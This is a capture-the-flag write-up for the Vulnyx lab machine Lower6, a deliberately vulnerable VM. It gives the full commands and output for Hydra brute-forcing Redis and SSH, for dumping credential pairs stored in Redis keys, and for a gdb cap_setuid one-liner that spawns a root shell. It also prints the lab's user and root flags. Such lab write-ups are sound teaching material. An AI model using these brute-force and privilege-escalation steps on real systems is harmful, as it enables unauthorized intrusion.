---
icon: linux
---

# Lower6 ​

## 🖥️ Writeup - Lower6

**Platform:** Vulnyx\
**Operating System:** Linux

> **Tags:** `Linux` `Redis` `Hydra` `Credential Dumping` `Credential Stuffing` `Capabilities` `Python`

## INSTALLATION

We download the `zip` containing the `.ova` of the Lower6 machine, extract it, and import it into VirtualBox.

We configure the network interface of the Lower6 machine and run it alongside the attacker machine.

## HOST DISCOVERY

At this point, we still don’t know which `IP` address is assigned to Lower6, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

Info:

```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:14:65:c8      1      60  PCS Systemtechnik GmbH      
 10.0.4.30       08:00:27:25:75:41      1      60  PCS Systemtechnik GmbH
```

We identify with high confidence that the victim’s IP is `10.0.4.30`.

## PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.30
```

```bash
nmap -n -Pn -sCV -p22,6379 --min-rate 5000 10.0.4.30
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 15:26 CET
Nmap scan report for 10.0.4.30
Host is up (0.00018s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
6379/tcp open  redis   Redis key-value store
MAC Address: 08:00:27:25:75:41 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.56 seconds
```

We identify open ports `22` (SSH) and `6379` (Redis).

## REDIS

We check if `Redis` allows anonymous authentication, but we discover that unauthenticated access is not permitted.

```bash
redis-cli -h 10.0.4.30 INFO
```

Info:

```
NOAUTH Authentication required.
```

Lacking other initial vectors, we attempt a `brute force` attack using `Hydra` to obtain the required password.

```bash
hydra -P /usr/share/wordlists/rockyou.txt redis://10.0.4.30 -t 64
```

Info:

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-05 15:35:14
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking redis://10.0.4.30:6379/
[6379][redis] host: 10.0.4.30   password: hellow
[STATUS] attack finished for 10.0.4.30 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

We successfully find the credentials to authenticate with Redis: `hellow`.

Now, we enumerate all Redis `keys` to look for sensitive information.

```bash
redis-cli -h 10.0.4.30 -a hellow KEYS '*'
```

Info:

```
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
1) "key2"
2) "key5"
3) "key3"
4) "key4"
5) "key1"
```

We discover 5 `keys` and inspect their content.

```bash
redis-cli -h 10.0.4.30 -a hellow MGET key1 key2 key3 key4 key5
```

Info:

```
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
1) "killer:K!ll3R123"
2) "ghost:Ghost!Hunter42"
3) "snake:Pixel_Sn4ke77"
4) "wolf:CyberWolf#21"
5) "shadow:ShadowMaze@9"
```

We notice that the `key` values follow a `user:password` format. We save the 5 usernames and the 5 passwords into separate wordlists.

```bash
nano users.txt
```

```
killer
ghost
snake
wolf
shadow
```

***

```bash
nano pass.txt
```

```
K!ll3R123
Ghost!Hunter42
Pixel_Sn4ke77
CyberWolf#21
ShadowMaze@9
```

Using these credentials, we launch a `brute force` attack against the `SSH` service on port `22`.

```bash
hydra -L users.txt -P pass.txt ssh://10.0.4.30 -t 64
```

Info:

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-05 15:45:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 25 tasks per 1 server, overall 25 tasks, 25 login tries (l:5/p:5), ~1 try per task
[DATA] attacking ssh://10.0.4.30:22/
[22][ssh] host: 10.0.4.30   login: killer   password: ShadowMaze@9
```

We find valid credentials for the user `killer` : `ShadowMaze@9`.

We log in via `SSH`.

```bash
ssh killer@10.0.4.30
```

## PRIVILEGE ESCALATION

We check for `sudo` privileges, `SUID` binaries, and Linux `capabilities`.

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

Info:

```
/usr/bin/ping cap_net_raw=ep
/usr/bin/gdb cap_setuid=ep
```

We notice that the `gdb` binary has the `cap_setuid` capability set, meaning we can leverage it as a backdoor to escalate privileges to `root`.

We consult `GTFOBins` to find the command needed to exploit this misconfiguration.

```bash
/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

Info:

```
# whoami
root
#
```

We are now root!

Finally, we locate both the `user flag` and the `root flag`:

```
# cat user.txt
8ec061fc51f064186d2b0661c004be93
# cd /root
# ls
root.txt
# cat root.txt
03f4adf5855fe3a1e0df4b0c885ec67a
#
```
